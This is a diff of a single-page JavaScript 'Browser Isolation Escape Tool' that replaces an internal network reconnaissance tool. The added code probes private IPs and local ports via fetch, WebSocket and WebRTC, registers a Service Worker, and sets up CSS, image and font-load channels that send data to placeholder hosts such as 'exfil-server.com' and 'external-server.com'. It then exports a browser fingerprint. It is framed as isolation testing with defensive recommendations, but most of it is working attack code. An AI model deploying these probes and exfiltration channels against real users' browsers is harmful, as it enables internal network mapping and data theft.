-            log('results', 'Generating comprehensive report...', 'info');
-            
-            const accessibleTargets = targets.filter(t => t.status === 'accessible');
-            const blockedTargets = targets.filter(t => t.status === 'blocked');
-            const partialTargets = targets.filter(t => t.status === 'partial');
-            
-            log('results', '', 'info');
-            log('results', '📊 RECONNAISSANCE SUMMARY:', 'success');
-            log('results', `Total Targets Tested: ${targets.length}`, 'info');
-            log('results', `Accessible Targets: ${accessibleTargets.length}`, 'success');
-            log('results', `Blocked Targets: ${blockedTargets.length}`, 'error');
-            log('results', `Partial Access: ${partialTargets.length}`, 'warning');
-            
-            if (accessibleTargets.length > 0) {
-                log('results', '', 'info');
-                log('results', '🎯 HIGH-VALUE ACCESSIBLE TARGETS:', 'critical');
-                accessibleTargets.forEach(target => {
-                    const services = target.results.discoveredPaths ? target.results.discoveredPaths.length : 0;
-                    const methods = target.results.httpMethods ? Object.keys(target.results.httpMethods).filter(m => target.results.httpMethods[m].accessible).length : 0;
-                    log('results', `  ${target.url} - ${services} services, ${methods} HTTP methods`, 'critical');
+            try {
+                const pc = new RTCPeerConnection({
+                    iceServers: [
+                        {urls: 'stun:stun.l.google.com:19302'},
+                        {urls: 'stun:stun1.l.google.com:19302'}
+                    ]
                 });
+                
+                pc.createDataChannel('test');
+                
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+                
+                pc.onicecandidate = function(event) {
+                    if (event.candidate) {
+                        const candidate = event.candidate.candidate;
+                        if (candidate.includes('192.168.') || candidate.includes('10.') || candidate.includes('172.')) {
+                            log('escape', `🚨 Internal IP disclosed via WebRTC: ${candidate}`, 'critical');
+                            successfulAttacks++;
+                            updateStats();
+                        }
+                        log('escape', `WebRTC candidate: ${candidate}`, 'info');
+                    }
+                };
+                
+                setTimeout(() => {
+                    pc.close();
+                    log('escape', 'WebRTC IP disclosure test completed', 'success');
+                }, 5000);
+                
+            } catch (error) {
+                log('escape', `WebRTC test failed: ${error.message}`, 'error');
+            }
+        }
+
+        async function testDNSRebinding() {
+            log('escape', '🔄 Testing DNS rebinding attack...', 'critical');
+            escapeAttempts++;
+            
+            // This is a simplified test - real DNS rebinding would require external domain control
+            const rebindingTargets = [
+                'localhost',
+                '127.0.0.1',
+                '192.168.1.1',
+                '10.0.0.1'
+            ];
+            
+            for (const target of rebindingTargets) {
+                try {
+                    const response = await fetch(`http://${target}`, {
+                        method: 'GET',
+                        mode: 'cors',
+                        signal: AbortSignal.timeout(2000)
+                    });
+                    
+                    log('escape', `🚨 DNS rebinding successful to ${target}`, 'critical');
+                    successfulAttacks++;
+                    
+                } catch (error) {
+                    log('escape', `DNS rebinding to ${target} blocked: ${error.message}`, 'info');
+                }
             }
             
-            log('results', '', 'info');
-            log('results', '🔗 Quick Access Links Generated', 'success');
-            log('results', '📡 Beacon Tests Completed', 'success');
-            log('results', '🕵️ Service Discovery Finished', 'success');
+            updateStats();
+            log('escape', 'DNS rebinding tests completed', 'success');
+        }
+
+        async function testServiceWorkers() {
+            log('escape', '⚙️ Testing Service Worker abuse...', 'warning');
+            escapeAttempts++;
+            
+            if ('serviceWorker' in navigator) {
+                try {
+                    const registration = await navigator.serviceWorker.register(
+                        'data:application/javascript,' + encodeURIComponent(`
+                            self.addEventListener('fetch', event => {
+                                console.log('Service Worker intercepted:', event.request.url);
+                                if (event.request.url.includes('internal')) {
+                                    event.respondWith(new Response('Service Worker Bypass Successful'));
+                                }
+                            });
+                        `),
+                        { scope: '/' }
+                    );
+                    
+                    log('escape', '🚨 Service Worker registered successfully!', 'critical');
+                    successfulAttacks++;
+                    
+                    setTimeout(() => {
+                        registration.unregister();
+                        log('escape', 'Service Worker unregistered', 'info');
+                    }, 5000);
+                    
+                } catch (error) {
+                    log('escape', `Service Worker registration failed: ${error.message}`, 'warning');
+                }
+            } else {
+                log('escape', 'Service Workers not supported', 'info');
+            }
             
             updateStats();
         }
 
-        function exportFindings() {
+        async function testWebSocketEscape() {
+            log('escape', '🔌 Testing WebSocket tunneling...', 'warning');
+            escapeAttempts++;
+            
+            const wsTargets = [
+                'ws://localhost:8080',
+                'ws://127.0.0.1:9000',
+                'ws://192.168.1.1:80',
+                'wss://echo.websocket.org'
+            ];
+            
+            for (const target of wsTargets) {
+                try {
+                    const ws = new WebSocket(target);
+                    
+                    ws.onopen = function() {
+                        log('escape', `🚨 WebSocket connection established to ${target}`, 'critical');
+                        successfulAttacks++;
+                        updateStats();
+                        
+                        ws.send(JSON.stringify({
+                            type: 'escape_test',
+                            timestamp: Date.now(),
+                            origin: window.location.origin
+                        }));
+                        
+                        setTimeout(() => ws.close(), 1000);
+                    };
+                    
+                    ws.onerror = function(error) {
+                        log('escape', `WebSocket connection to ${target} failed`, 'info');
+                    };
+                    
+                } catch (error) {
+                    log('escape', `WebSocket test to ${target} error: ${error.message}`, 'warning');
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+            
+            log('escape', 'WebSocket tunneling tests completed', 'success');
+        }
+
+        // Data Exfiltration Functions
+        async function testImageExfiltration() {
+            log('exfiltration', '🖼️ Testing image-based data exfiltration...', 'critical');
+            escapeAttempts++;
+            
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 100;
+                
+                // Encode data in image pixels
+                const testData = 'EXFIL_TEST_' + Date.now();
+                ctx.fillStyle = '#000000';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                // Encode each character as pixel intensity
+                for (let i = 0; i < testData.length; i++) {
+                    const charCode = testData.charCodeAt(i);
+                    ctx.fillStyle = `rgb(${charCode}, ${charCode}, ${charCode})`;
+                    ctx.fillRect(i * 8, 0, 8, 8);
+                }
+                
+                const imageData = canvas.toDataURL('image/png');
+                
+                // Attempt to exfiltrate via image request
+                const img = new Image();
+                img.onload = function() {
+                    log('exfiltration', '🚨 Image-based exfiltration successful!', 'critical');
+                    successfulAttacks++;
+                    updateStats();
+                };
+                img.onerror = function() {
+                    log('exfiltration', 'Image exfiltration blocked', 'warning');
+                };
+                
+                // This would normally go to an external server
+                img.src = imageData;
+                
+                log('exfiltration', 'Image exfiltration test initiated', 'info');
+                
+            } catch (error) {
+                log('exfiltration', `Image exfiltration failed: ${error.message}`, 'error');
+            }
+        }
+
+        async function testCSSExfiltration() {
+            log('exfiltration', '🎨 Testing CSS-based data exfiltration...', 'critical');
+            escapeAttempts++;
+            
+            try {
+                const style = document.createElement('style');
+                style.innerHTML = `
+                    .exfil-test[data-secret*="admin"] {
+                        background-image: url('http://external-server.com/exfil?found=admin');
+                    }
+                    .exfil-test[data-secret*="password"] {
+                        background-image: url('http://external-server.com/exfil?found=password');
+                    }
+                    .exfil-test[data-secret*="token"] {
+                        background-image: url('http://external-server.com/exfil?found=token');
+                    }
+                `;
+                
+                document.head.appendChild(style);
+                
+                const testElement = document.createElement('div');
+                testElement.className = 'exfil-test';
+                testElement.setAttribute('data-secret', 'admin_password_token_123');
+                document.body.appendChild(testElement);
+                
+                log('exfiltration', '🚨 CSS attribute selector exfiltration setup complete', 'critical');
+                successfulAttacks++;
+                
+                setTimeout(() => {
+                    document.head.removeChild(style);
+                    document.body.removeChild(testElement);
+                }, 3000);
+                
+            } catch (error) {
+                log('exfiltration', `CSS exfiltration failed: ${error.message}`, 'error');
+            }
+            
+            updateStats();
+        }
+
+        async function testTimingAttacks() {
+            log('exfiltration', '⏱️ Testing timing-based attacks...', 'warning');
+            escapeAttempts++;
+            
+            const timingTargets = targets.slice(0, 5); // Test first 5 targets
+            
+            for (const target of timingTargets) {
+                const fullTarget = target.port ? `${target.host}:${target.port}` : target.host;
+                
+                try {
+                    const timings = [];
+                    
+                    for (let i = 0; i < 5; i++) {
+                        const startTime = performance.now();
+                        
+                        try {
+                            await fetch(`http://${fullTarget}`, {
+                                method: 'HEAD',
+                                mode: 'no-cors',
+                                signal: AbortSignal.timeout(1000)
+                            });
+                        } catch (error) {
+                            // Timing is still measured even on error
+                        }
+                        
+                        const endTime = performance.now();
+                        timings.push(endTime - startTime);
+                        
+                        await new Promise(resolve => setTimeout(resolve, 100));
+                    }
+                    
+                    const avgTiming = timings.reduce((a, b) => a + b, 0) / timings.length;
+                    const variance = timings.map(t => Math.abs(t - avgTiming)).reduce((a, b) => a + b, 0) / timings.length;
+                    
+                    log('exfiltration', `${fullTarget} - Avg: ${avgTiming.toFixed(2)}ms, Variance: ${variance.toFixed(2)}ms`, 'info');
+                    
+                    if (variance < 10) {
+                        log('exfiltration', `🚨 Consistent timing detected for ${fullTarget} - potential timing channel`, 'critical');
+                        successfulAttacks++;
+                    }
+                    
+                } catch (error) {
+                    log('exfiltration', `Timing test failed for ${fullTarget}: ${error.message}`, 'warning');
+                }
+            }
+            
+            updateStats();
+            log('exfiltration', 'Timing attack tests completed', 'success');
+        }
+
+        async function establishCovertChannel() {
+            log('exfiltration', '📡 Establishing covert communication channels...', 'critical');
+            escapeAttempts++;
+            
+            // Test multiple covert channels
+            const channels = [
+                {
+                    name: 'DNS Query',
+                    test: async () => {
+                        try {
+                            await fetch('https://dns.google/resolve?name=exfil-test-' + Date.now() + '.example.com');
+                            return true;
+                        } catch (error) {
+                            return false;
+                        }
+                    }
+                },
+                {
+                    name: 'Image Error Handler',
+                    test: async () => {
+                        return new Promise((resolve) => {
+                            const img = new Image();
+                            img.onerror = () => resolve(true);
+                            img.onload = () => resolve(true);
+                            img.src = 'http://exfil-server.com/data?payload=' + btoa('test_data');
+                            setTimeout(() => resolve(false), 3000);
+                        });
+                    }
+                },
+                {
+                    name: 'CSS Font Loading',
+                    test: async () => {
+                        try {
+                            const style = document.createElement('style');
+                            style.innerHTML = `@font-face { font-family: 'ExfilFont'; src: url('http://exfil-server.com/font?data=test'); }`;
+                            document.head.appendChild(style);
+                            
+                            const testElement = document.createElement('div');
+                            testElement.style.fontFamily = 'ExfilFont';
+                            testElement.textContent = 'test';
+                            document.body.appendChild(testElement);
+                            
+                            setTimeout(() => {
+                                document.head.removeChild(style);
+                                document.body.removeChild(testElement);
+                            }, 2000);
+                            
+                            return true;
+                        } catch (error) {
+                            return false;
+                        }
+                    }
+                }
+            ];
+            
+            for (const channel of channels) {
+                try {
+                    const result = await channel.test();
+                    if (result) {
+                        log('exfiltration', `🚨 Covert channel established: ${channel.name}`, 'critical');
+                        successfulAttacks++;
+                    } else {
+                        log('exfiltration', `${channel.name} channel blocked`, 'warning');
+                    }
+                } catch (error) {
+                    log('exfiltration', `${channel.name} channel error: ${error.message}`, 'error');
+                }
+            }
+            
+            updateStats();
+            log('exfiltration', 'Covert channel establishment completed', 'success');
+        }
+
+        // Main test runner
+        async function runAllTests() {
+            log('results', '🚀 Starting comprehensive browser isolation escape tests...', 'critical');
+            
+            const testSuite = [
+                { name: 'Extension Access', func: testExtensionAccess },
+                { name: 'Config Modification', func: testConfigModification },
+                { name: 'Local File Access', func: testLocalFileAccess },
+                { name: 'Local Storage', func: testLocalStorage },
+                { name: 'Local Host Enumeration', func: enumerateLocalHosts },
+                { name: 'Internal Assets', func: testInternalAssets },
+                { name: 'WebRTC Escape', func: testWebRTCEscape },
+                { name: 'DNS Rebinding', func: testDNSRebinding },
+                { name: 'Service Workers', func: testServiceWorkers },
+                { name: 'WebSocket Escape', func: testWebSocketEscape },
+                { name: 'Image Exfiltration', func: testImageExfiltration },
+                { name: 'CSS Exfiltration', func: testCSSExfiltration },
+                { name: 'Timing Attacks', func: testTimingAttacks },
+                { name: 'Covert Channels', func: establishCovertChannel }
+            ];
+            
+            for (let i = 0; i < testSuite.length; i++) {
+                const test = testSuite[i];
+                log('results', `Running ${test.name}...`, 'info');
+                
+                try {
+                    await test.func();
+                    await new Promise(resolve => setTimeout(resolve, 1000)); // Pause between tests
+                } catch (error) {
+                    log('results', `${test.name} failed: ${error.message}`, 'error');
+                }
+                
+                updateProgress(i + 1, testSuite.length);
+            }
+            
+            generateComprehensiveReport();
+            log('results', '✅ All escape tests completed!', 'success');
+        }
+
+        function generateComprehensiveReport() {
+            log('results', '', 'info');
+            log('results', '📊 BROWSER ISOLATION ESCAPE REPORT', 'critical');
+            log('results', '='.repeat(50), 'info');
+            log('results', `Total Escape Attempts: ${escapeAttempts}`, 'info');
+            log('results', `Successful Attacks: ${successfulAttacks}`, successfulAttacks > 0 ? 'critical' : 'success');
+            log('results', `Browser Tests Executed: ${browserTestCount}`, 'info');
+            log('results', `Network Targets Tested: ${targets.length}`, 'info');
+            
+            const successRate = escapeAttempts > 0 ? ((successfulAttacks / escapeAttempts) * 100).toFixed(1) : 0;
+            log('results', `Success Rate: ${successRate}%`, successRate > 0 ? 'critical' : 'success');
+            
+            log('results', '', 'info');
+            log('results', '🎯 ACCESSIBLE TARGETS:', 'success');
+            const accessibleTargets = targets.filter(t => t.status === 'accessible');
+            if (accessibleTargets.length > 0) {
+                accessibleTargets.forEach(target => {
+                    const fullTarget = target.port ? `${target.host}:${target.port}` : target.host;
+                    log('results', `  ✅ ${fullTarget} (${target.service})`, 'success');
+                });
+            } else {
+                log('results', '  No accessible targets found', 'info');
+            }
+            
+            log('results', '', 'info');
+            if (successfulAttacks > 0) {
+                log('results', '🚨 SECURITY RECOMMENDATIONS:', 'critical');
+                log('results', '  - Review browser isolation policies', 'warning');
+                log('results', '  - Implement additional network segmentation', 'warning');
+                log('results', '  - Monitor for escape attempt indicators', 'warning');
+                log('results', '  - Consider additional DLP controls', 'warning');
+            } else {
+                log('results', '✅ Browser isolation appears to be functioning correctly', 'success');
+            }
+        }
+
+        function analyzeSuccessfulEscapes() {
+            log('results', '🔍 Analyzing successful escape techniques...', 'info');
+            
+            Object.keys(testResults).forEach(section => {
+                const sectionResults = testResults[section];
+                const criticalResults = sectionResults.filter(r => r.type === 'critical');
+                
+                if (criticalResults.length > 0) {
+                    log('results', `${section.toUpperCase()} - Critical findings:`, 'critical');
+                    criticalResults.forEach(result => {
+                        log('results', `  ${result.message}`, 'critical');
+                    });
+                }
+            });
+        }
+
+        function exportResults() {
             const exportData = {
                 timestamp: new Date().toISOString(),
                 summary: {
-                    totalTargets: targets.length,
-                    accessibleTargets: targets.filter(t => t.status === 'accessible').length,
-                    blockedTargets: targets.filter(t => t.status === 'blocked').length
+                    escapeAttempts: escapeAttempts,
+                    successfulAttacks: successfulAttacks,
+                    browserTests: browserTestCount,
+                    networkTargets: targets.length,
+                    accessibleTargets: targets.filter(t => t.status === 'accessible').length
                 },
                 targets: targets,
-                testResults: testResults
+                testResults: testResults,
+                environment: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    cookieEnabled: navigator.cookieEnabled,
+                    onLine: navigator.onLine
+                }
             };
             
             const jsonData = JSON.stringify(exportData, null, 2);
@@ -941,29 +2070,89 @@
             
             const a = document.createElement('a');
             a.href = url;
-            a.download = `network_reconnaissance_${Date.now()}.json`;
+            a.download = `browser_isolation_escape_report_${Date.now()}.json`;
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
             URL.revokeObjectURL(url);
             
-            log('results', '📁 Findings exported successfully', 'success');
+            log('results', '📁 Results exported successfully', 'success');
         }
 
-        function clearAllResults() {
-            const outputs = document.querySelectorAll('.output');
-            outputs.forEach(output => output.innerHTML = '');
-            testResults = {};
-            completedTests = 0;
-            totalTests = 0;
-            updateProgress();
-            updateStats();
+        function exportTechnicalDetails() {
+            const technicalData = {
+                timestamp: new Date().toISOString(),
+                browserCapabilities: {
+                    webrtc: typeof RTCPeerConnection !== 'undefined',
+                    websockets: typeof WebSocket !== 'undefined',
+                    serviceWorkers: 'serviceWorker' in navigator,
+                    indexedDB: typeof indexedDB !== 'undefined',
+                    geolocation: 'geolocation' in navigator,
+                    notifications: 'Notification' in window,
+                    webGL: !!document.createElement('canvas').getContext('webgl'),
+                    webAudio: typeof AudioContext !== 'undefined' || typeof webkitAudioContext !== 'undefined'
+                },
+                storageCapabilities: {
+                    localStorage: typeof localStorage !== 'undefined',
+                    sessionStorage: typeof sessionStorage !== 'undefined',
+                    indexedDB: typeof indexedDB !== 'undefined',
+                    webSQL: typeof openDatabase !== 'undefined'
+                },
+                networkCapabilities: {
+                    fetch: typeof fetch !== 'undefined',
+                    xmlHttpRequest: typeof XMLHttpRequest !== 'undefined',
+                    cors: true, // Assume CORS is supported in modern browsers
+                    websockets: typeof WebSocket !== 'undefined'
+                },
+                detailedResults: testResults
+            };
+            
+            const jsonData = JSON.stringify(technicalData, null, 2);
+            const blob = new Blob([jsonData], {type: 'application/json'});
+            const url = URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `technical_capabilities_${Date.now()}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            log('results', '📁 Technical details exported successfully', 'success');
         }
+
+        // File drop functionality
+        const dropZone = document.getElementById('file-drop-zone');
+        
+        dropZone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            dropZone.classList.add('dragover');
+        });
+        
+        dropZone.addEventListener('dragleave', () => {
+            dropZone.classList.remove('dragover');
+        });
+        
+        dropZone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            dropZone.classList.remove('dragover');
+            
+            const files = e.dataTransfer.files;
+            if (files.length > 0) {
+                const file = files[0];
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    parseTargetFile(e.target.result, file.name);
+                };
+                reader.readAsText(file);
+            }
+        });
 
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
-            log('results', '🕵️ Internal Network Reconnaissance Tool loaded', 'success');
-            log('results', 'Add targets and run comprehensive tests to discover accessible internal services', 'info');
+            log('results', '🔓 Browser Isolation Escape Tool loaded successfully', 'critical');
+            log('results', 'Upload target lists and execute comprehensive escape tests', 'info');
             updateStats();
         });
     </script>
